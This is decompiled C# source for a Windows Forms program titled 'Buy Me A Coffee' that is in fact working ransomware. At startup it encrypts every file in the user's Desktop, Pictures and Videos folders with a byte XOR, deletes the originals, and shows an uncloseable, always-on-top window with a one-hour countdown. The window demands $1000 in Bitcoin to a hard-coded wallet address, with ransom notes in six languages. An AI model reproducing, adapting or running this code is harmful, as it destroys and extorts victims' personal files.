using System;
using System.ComponentModel;
using System.Drawing;
using System.Drawing.Drawing2D;
using System.IO;
using System.Text;
using System.Windows.Forms;

namespace BuyMeACoffee;

public class Form1 : Form
{
	private int timeLeft = 3600;

	private IContainer components = null;

	private Panel panel1;

	private Label label1;

	private TextBox textBox1;

	private ProgressBar progressBar1;

	private Timer timer1;

	private Label label2;

	private ComboBox comboBox1;

	private Label label3;

	private Button button1;

	private Button button2;

	private TextBox textBox2;

	protected override CreateParams CreateParams
	{
		get
		{
			CreateParams createParams = ((Form)this).get_CreateParams();
			createParams.set_ClassStyle(createParams.get_ClassStyle() | 0x20000);
			return createParams;
		}
	}

	public Form1()
	{
		InitializeComponent();
		RePaint();
		FlaekFiles();
		((Form)this).set_TopMost(true);
		progressBar1.set_Maximum(timeLeft);
	}

	private void FlaekFiles()
	{
		string[] files = Directory.GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.Desktop), "*.*", SearchOption.AllDirectories);
		string[] files2 = Directory.GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.MyPictures), "*.*", SearchOption.AllDirectories);
		string[] files3 = Directory.GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.MyVideos), "*.*", SearchOption.AllDirectories);
		string[] array = files;
		foreach (string inputFile in array)
		{
			EncryptFile(inputFile);
		}
		string[] array2 = files2;
		foreach (string inputFile2 in array2)
		{
			EncryptFile(inputFile2);
		}
		string[] array3 = files3;
		foreach (string inputFile3 in array3)
		{
			EncryptFile(inputFile3);
		}
	}

	private void UnFlaekFiles()
	{
		string[] files = Directory.GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.Desktop), "*.*", SearchOption.AllDirectories);
		string[] files2 = Directory.GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.MyPictures), "*.*", SearchOption.AllDirectories);
		string[] files3 = Directory.GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.MyVideos), "*.*", SearchOption.AllDirectories);
		string[] array = files;
		foreach (string inputFile in array)
		{
			DecryptFile(inputFile);
		}
		string[] array2 = files2;
		foreach (string inputFile2 in array2)
		{
			DecryptFile(inputFile2);
		}
		string[] array3 = files3;
		foreach (string inputFile3 in array3)
		{
			DecryptFile(inputFile3);
		}
	}

	private string GetFileName(string path)
	{
		string result = path;
		int num = path.LastIndexOf('.');
		if (num > 0)
		{
			result = path.Substring(0, num);
		}
		return result;
	}

	private string GetFileExt(string path)
	{
		string result = "";
		int num = path.LastIndexOf('.');
		if (num > 0)
		{
			result = path.Substring(num + 1);
		}
		return result;
	}

	private byte ByteEncrypt(byte b)
	{
		return (byte)(b ^ 0x80u);
	}

	private byte[] StrToByteArray(string st, Encoding enc)
	{
		return enc.GetBytes(st);
	}

	private string ByteArrayToStr(byte[] bstr, Encoding enc)
	{
		return enc.GetString(bstr);
	}

	public bool EncryptFile(string inputFile)
	{
		string fileName = GetFileName(inputFile);
		string fileExt = GetFileExt(inputFile);
		byte[] array = StrToByteArray(fileExt, new UnicodeEncoding());
		int num = array.Length;
		try
		{
			FileStream fileStream = new FileStream(inputFile, FileMode.Open);
			FileStream fileStream2 = new FileStream(fileName + ".UniquezHD", FileMode.Create);
			fileStream2.Write(BitConverter.GetBytes(num), 0, 4);
			fileStream2.Write(array, 0, num);
			int num2;
			while ((num2 = fileStream.ReadByte()) != -1)
			{
				fileStream2.WriteByte(ByteEncrypt((byte)num2));
			}
			fileStream.Close();
			fileStream2.Close();
			File.Delete(inputFile);
			return true;
		}
		catch
		{
		}
		return false;
	}

	public bool DecryptFile(string inputFile)
	{
		try
		{
			FileStream fileStream = new FileStream(inputFile, FileMode.Open);
			string fileName = GetFileName(inputFile);
			byte[] array = new byte[4];
			fileStream.Read(array, 0, 4);
			int num = BitConverter.ToInt32(array, 0);
			byte[] array2 = new byte[num];
			fileStream.Read(array2, 0, num);
			string text = "." + ByteArrayToStr(array2, new UnicodeEncoding());
			FileStream fileStream2 = new FileStream(fileName + text, FileMode.Create);
			int num2;
			while ((num2 = fileStream.ReadByte()) != -1)
			{
				fileStream2.WriteByte(ByteEncrypt((byte)num2));
			}
			fileStream.Close();
			fileStream2.Close();
			return true;
		}
		catch
		{
		}
		return false;
	}

	private void Log(string log)
	{
		((Control)textBox1).set_Text(log);
	}

	protected void RePaint()
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		//IL_00d9: Unknown result type (might be due to invalid IL or missing references)
		//IL_00e3: Expected O, but got Unknown
		GraphicsPath val = new GraphicsPath();
		val.StartFigure();
		val.AddArc(0, 0, 25, 25, 180f, 90f);
		val.AddLine(25, 0, ((Control)this).get_Width() - 25, 0);
		val.AddArc(((Control)this).get_Width() - 25, 0, 25, 25, 270f, 90f);
		val.AddLine(((Control)this).get_Width(), 25, ((Control)this).get_Width(), ((Control)this).get_Height() - 25);
		val.AddArc(((Control)this).get_Width() - 25, ((Control)this).get_Height() - 25, 25, 25, 0f, 90f);
		val.AddLine(((Control)this).get_Width() - 25, ((Control)this).get_Height(), 25, ((Control)this).get_Height());
		val.AddArc(0, ((Control)this).get_Height() - 25, 25, 25, 90f, 90f);
		val.CloseFigure();
		((Control)this).set_Region(new Region(val));
	}

	private void comboBox1_SelectedIndexChanged(object sender, EventArgs e)
	{
		if (((ListControl)comboBox1).get_SelectedIndex() == 0)
		{
			Log("Send $1000 worth of BTC if you want to save all your personal files to this adress 1Fn9umL4okj5yvBMd9jeSaUB4E5KZJ4YFW");
			((Control)label1).set_Text("Hello " + Environment.UserName + " Your files are encrypted");
			((Control)label3).set_Text("Seconds left before the files are destroyed");
		}
		if (((ListControl)comboBox1).get_SelectedIndex() == 1)
		{
			((Control)label3).set_Text("Sekunder tilbage før filerne bliver ødelagt");
			((Control)label1).set_Text("Hej " + Environment.UserName + " Dine filer er krypteret");
			Log("Send $1000 af værdi i BTC this du vil rede dine personlige filer til den her adress 1Fn9umL4okj5yvBMd9jeSaUB4E5KZJ4YFW");
		}
		if (((ListControl)comboBox1).get_SelectedIndex() == 2)
		{
			((Control)label3).set_Text("Секунды остались до уничтожения файлов");
			((Control)label1).set_Text("Привет " + Environment.UserName + " Ваши файлы зашифрованы");
			Log("Отправьте BTC на сумму 1000 долларов если хотите сохранить все свои личные файлы по этому адресу 1Fn9umL4okj5yvBMd9jeSaUB4E5KZJ4YFW");
		}
		if (((ListControl)comboBox1).get_SelectedIndex() == 3)
		{
			((Control)label3).set_Text("تبقى الثواني قبل إتلاف الملفات");
			((Control)label1).set_Text("مرحبا " + Environment.UserName + " ملفاتك مشفرة");
			Log("أرسل BTC بقيمة 1000 دولار إذا كنت تريد حفظ جميع ملفاتك الشخصية على هذا العنوان 1Fn9umL4okj5yvBMd9jeSaUB4E5KZJ4YFW");
		}
		if (((ListControl)comboBox1).get_SelectedIndex() == 4)
		{
			((Control)label3).set_Text("文件销毁前剩余的秒数");
			((Control)label1).set_Text("你好 " + Environment.UserName + " 您的文件已加密");
			Log("如果要将所有个人文件保存到此地址 请发送价值$ 1000的BTC 1Fn9umL4okj5yvBMd9jeSaUB4E5KZJ4YFW");
		}
		if (((ListControl)comboBox1).get_SelectedIndex() == 5)
		{
			((Control)label3).set_Text("फ\u093c\u093eइल\u094b\u0902 क\u094b नष\u094dट ह\u094bन\u0947 स\u0947 पहल\u0947 छ\u094bड\u093c द\u093fय\u093e स\u0947क\u0902ड");
			((Control)label1).set_Text("नमस\u094dत\u0947 " + Environment.UserName + " आपक\u0940 फ\u093c\u093eइल\u094b\u0902 क\u094b एन\u094dक\u094dर\u093fप\u094dट क\u093fय\u093e गय\u093e ह\u0948");
			Log("यद\u093f आप अपन\u0940 सभ\u0940 व\u094dयक\u094dत\u093fगत फ\u093c\u093eइल\u094b\u0902 क\u094b इस एड\u094dर\u0947स म\u0947\u0902 सह\u0947जन\u093e च\u093eहत\u0947 ह\u0948\u0902 त\u094b $ 1000 क\u093e BTC भ\u0947ज\u0947\u0902 1Fn9umL4okj5yvBMd9jeSaUB4E5KZJ4YFW");
		}
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		((ListControl)comboBox1).set_SelectedIndex(0);
	}

	private void textBox1_TextChanged(object sender, EventArgs e)
	{
	}

	private void timer1_Tick(object sender, EventArgs e)
	{
		if (timeLeft > 0)
		{
			timeLeft--;
			((Control)label2).set_Text($"{timeLeft}");
			ProgressBar obj = progressBar1;
			int value = obj.get_Value();
			obj.set_Value(value + 1);
		}
	}

	private void Form1_FormClosing(object sender, FormClosingEventArgs e)
	{
		((CancelEventArgs)(object)e).Cancel = true;
	}

	private void button2_Click(object sender, EventArgs e)
	{
		Clipboard.SetText("1Fn9umL4okj5yvBMd9jeSaUB4E5KZJ4YFW");
		Environment.Exit(0);
	}

	private void button1_Click(object sender, EventArgs e)
	{
		UnFlaekFiles();
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_001c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0026: Expected O, but got Unknown
		//IL_0027: Unknown result type (might be due to invalid IL or missing references)
		//IL_0031: Expected O, but got Unknown
		//IL_0032: Unknown result type (might be due to invalid IL or missing references)
		//IL_003c: Expected O, but got Unknown
		//IL_003d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0047: Expected O, but got Unknown
		//IL_004e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0058: Expected O, but got Unknown
		//IL_0059: Unknown result type (might be due to invalid IL or missing references)
		//IL_0063: Expected O, but got Unknown
		//IL_0064: Unknown result type (might be due to invalid IL or missing references)
		//IL_006e: Expected O, but got Unknown
		//IL_006f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0079: Expected O, but got Unknown
		//IL_007a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0084: Expected O, but got Unknown
		//IL_0085: Unknown result type (might be due to invalid IL or missing references)
		//IL_008f: Expected O, but got Unknown
		//IL_0090: Unknown result type (might be due to invalid IL or missing references)
		//IL_009a: Expected O, but got Unknown
		//IL_0147: Unknown result type (might be due to invalid IL or missing references)
		//IL_0151: Expected O, but got Unknown
		//IL_01ec: Unknown result type (might be due to invalid IL or missing references)
		//IL_01f6: Expected O, but got Unknown
		//IL_031d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0327: Expected O, but got Unknown
		//IL_039a: Unknown result type (might be due to invalid IL or missing references)
		//IL_03a4: Expected O, but got Unknown
		//IL_0479: Unknown result type (might be due to invalid IL or missing references)
		//IL_0483: Expected O, but got Unknown
		//IL_04f9: Unknown result type (might be due to invalid IL or missing references)
		//IL_0503: Expected O, but got Unknown
		//IL_05a2: Unknown result type (might be due to invalid IL or missing references)
		//IL_05ac: Expected O, but got Unknown
		//IL_0655: Unknown result type (might be due to invalid IL or missing references)
		//IL_065f: Expected O, but got Unknown
		//IL_07b6: Unknown result type (might be due to invalid IL or missing references)
		//IL_07c0: Expected O, but got Unknown
		//IL_07e5: Unknown result type (might be due to invalid IL or missing references)
		//IL_07ef: Expected O, but got Unknown
		components = new Container();
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(Form1));
		panel1 = new Panel();
		label1 = new Label();
		textBox1 = new TextBox();
		progressBar1 = new ProgressBar();
		timer1 = new Timer(components);
		label2 = new Label();
		comboBox1 = new ComboBox();
		label3 = new Label();
		button1 = new Button();
		button2 = new Button();
		textBox2 = new TextBox();
		((Control)panel1).SuspendLayout();
		((Control)this).SuspendLayout();
		((Control)panel1).set_BackColor(Color.FromArgb(50, 49, 69));
		((Control)panel1).get_Controls().Add((Control)(object)label1);
		((Control)panel1).set_Dock((DockStyle)1);
		((Control)panel1).set_Location(new Point(0, 0));
		((Control)panel1).set_Name("panel1");
		((Control)panel1).set_Size(new Size(800, 67));
		((Control)panel1).set_TabIndex(0);
		((Control)label1).set_AutoSize(true);
		((Control)label1).set_Font(new Font("Comic Sans MS", 20.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)label1).set_Location(new Point(6, 15));
		((Control)label1).set_Name("label1");
		((Control)label1).set_Size(new Size(398, 38));
		((Control)label1).set_TabIndex(0);
		((Control)label1).set_Text("Hello Your files are encrypted");
		((Control)textBox1).set_BackColor(Color.FromArgb(44, 43, 60));
		((TextBoxBase)textBox1).set_BorderStyle((BorderStyle)0);
		((Control)textBox1).set_Cursor(Cursors.get_No());
		((Control)textBox1).set_Font(new Font("Microsoft Sans Serif", 14.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)textBox1).set_ForeColor(Color.White);
		((Control)textBox1).set_Location(new Point(12, 205));
		((TextBoxBase)textBox1).set_Multiline(true);
		((Control)textBox1).set_Name("textBox1");
		((TextBoxBase)textBox1).set_ReadOnly(true);
		((Control)textBox1).set_Size(new Size(615, 243));
		((Control)textBox1).set_TabIndex(2);
		((Control)textBox1).add_TextChanged((EventHandler)textBox1_TextChanged);
		((Control)progressBar1).set_Location(new Point(0, 176));
		((Control)progressBar1).set_Name("progressBar1");
		((Control)progressBar1).set_Size(new Size(800, 23));
		((Control)progressBar1).set_TabIndex(3);
		timer1.set_Enabled(true);
		timer1.set_Interval(1000);
		timer1.add_Tick((EventHandler)timer1_Tick);
		((Control)label2).set_AutoSize(true);
		((Control)label2).set_Font(new Font("Comic Sans MS", 20.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)label2).set_Location(new Point(19, 100));
		((Control)label2).set_Name("label2");
		((Control)label2).set_Size(new Size(81, 38));
		((Control)label2).set_TabIndex(4);
		((Control)label2).set_Text("3600");
		comboBox1.set_DropDownStyle((ComboBoxStyle)2);
		((Control)comboBox1).set_Font(new Font("Microsoft Sans Serif", 11.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((ListControl)comboBox1).set_FormattingEnabled(true);
		comboBox1.get_Items().AddRange(new object[6] { "English", "Danish", "Russian", "Arabic", "Chinese", "Hindi" });
		((Control)comboBox1).set_Location(new Point(633, 206));
		((Control)comboBox1).set_Name("comboBox1");
		((Control)comboBox1).set_Size(new Size(167, 26));
		((Control)comboBox1).set_TabIndex(5);
		comboBox1.add_SelectedIndexChanged((EventHandler)comboBox1_SelectedIndexChanged);
		((Control)label3).set_AutoSize(true);
		((Control)label3).set_Font(new Font("Comic Sans MS", 20.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)label3).set_Location(new Point(93, 100));
		((Control)label3).set_Name("label3");
		((Control)label3).set_Size(new Size(577, 38));
		((Control)label3).set_TabIndex(6);
		((Control)label3).set_Text("Seconds left before the files are destroyed");
		((ButtonBase)button1).set_FlatStyle((FlatStyle)0);
		((Control)button1).set_Font(new Font("Yu Gothic", 9.75f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)button1).set_Location(new Point(633, 267));
		((Control)button1).set_Name("button1");
		((Control)button1).set_Size(new Size(167, 32));
		((Control)button1).set_TabIndex(7);
		((Control)button1).set_Text("Validate Payment");
		((ButtonBase)button1).set_UseVisualStyleBackColor(true);
		((Control)button1).add_Click((EventHandler)button1_Click);
		((ButtonBase)button2).set_FlatStyle((FlatStyle)0);
		((Control)button2).set_Font(new Font("Yu Gothic", 9.75f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)button2).set_Location(new Point(633, 306));
		((Control)button2).set_Name("button2");
		((Control)button2).set_Size(new Size(167, 32));
		((Control)button2).set_TabIndex(8);
		((Control)button2).set_Text("Copy Adress");
		((ButtonBase)button2).set_UseVisualStyleBackColor(true);
		((Control)button2).add_Click((EventHandler)button2_Click);
		((Control)textBox2).set_BackColor(Color.FromArgb(44, 43, 60));
		((Control)textBox2).set_Font(new Font("Comic Sans MS", 8.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)textBox2).set_ForeColor(Color.White);
		((Control)textBox2).set_Location(new Point(633, 238));
		((Control)textBox2).set_Name("textBox2");
		((Control)textBox2).set_Size(new Size(167, 23));
		((Control)textBox2).set_TabIndex(9);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Control)this).set_BackColor(Color.FromArgb(44, 43, 60));
		((Form)this).set_ClientSize(new Size(800, 450));
		((Control)this).get_Controls().Add((Control)(object)textBox2);
		((Control)this).get_Controls().Add((Control)(object)button2);
		((Control)this).get_Controls().Add((Control)(object)button1);
		((Control)this).get_Controls().Add((Control)(object)label3);
		((Control)this).get_Controls().Add((Control)(object)comboBox1);
		((Control)this).get_Controls().Add((Control)(object)label2);
		((Control)this).get_Controls().Add((Control)(object)progressBar1);
		((Control)this).get_Controls().Add((Control)(object)textBox1);
		((Control)this).get_Controls().Add((Control)(object)panel1);
		((Control)this).set_ForeColor(Color.White);
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		((Form)this).set_Icon((Icon)componentResourceManager.GetObject("$this.Icon"));
		((Control)this).set_Name("Form1");
		((Form)this).set_StartPosition((FormStartPosition)1);
		((Control)this).set_Text("Buy Me A Coffee");
		((Form)this).add_FormClosing(new FormClosingEventHandler(Form1_FormClosing));
		((Form)this).add_Load((EventHandler)Form1_Load);
		((Control)panel1).ResumeLayout(false);
		((Control)panel1).PerformLayout();
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}
}
